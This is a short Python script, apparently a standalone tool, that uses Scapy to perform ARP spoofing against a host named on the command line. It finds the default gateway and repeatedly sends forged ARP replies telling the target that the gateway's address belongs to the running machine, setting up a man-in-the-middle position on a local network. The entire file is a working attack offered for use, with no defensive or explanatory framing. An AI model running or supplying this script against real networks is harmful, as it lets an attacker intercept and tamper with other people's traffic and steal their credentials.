from scapy.all import *
import sys
import time


def man_in_the_middle(host, spam_interval):
    try:
        router_ip = conf.route.route("0.0.0.0")[2] #192.168.1.1
        while True:
            packet = ARP(op=2, pdst=host, psrc=router_ip) #Default value of hwsrc will be machine's mac
            print(packet.summary())
            sendp(packet, verbose=False)
            time.sleep(spam_interval)

    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    if len(sys.argv) < 3 or len(sys.argv) > 3:
        print("Invalid Arguments")
    else:
        host = sys.argv[1]
        spam_interval = int(sys.argv[2])
        man_in_the_middle(host, spam_interval)
